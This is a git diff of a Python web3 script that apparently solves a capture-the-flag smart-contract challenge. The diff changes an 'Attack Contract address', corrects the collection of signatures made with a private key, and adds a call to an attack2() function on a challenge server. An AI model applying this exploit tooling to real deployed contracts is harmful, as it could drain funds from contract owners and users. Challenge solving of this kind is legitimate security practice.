@@ -27,7 +27,7 @@ SetupContract =  x["setupAddress"]
 WalletContract = x["WalletAddress"]
 
 #Attack Contract address
-Target2Contract = "0x2B5d196C89fed034a97fa56a87E520a0C5e0833C"
+Target2Contract = "0x3477a17F7174B1053b344403615d289b2BE63f5d"
 
 url = 'http://157.245.39.76:32639'
 
@@ -53,14 +53,14 @@ for address in addresses:
 	data_to_sign = w3.keccak(text=address).hex()
 	account = Account.from_key(PrivateKey)
 	signature = account.signHash(data_to_sign).signature
-	signatures.append(address)
-
+	signatures.append(signature)
 print(signatures)
 
 compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.8.18")
 abi = compiled['Contract.sol:Contract']['abi']
 contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
-
+number = contract_instance2.functions.attack2().call()
+print(number)
 
 exit(0)
 compiled = compile_files(["Campaign.sol"], output_values=["abi"], solc_version="0.8.18")
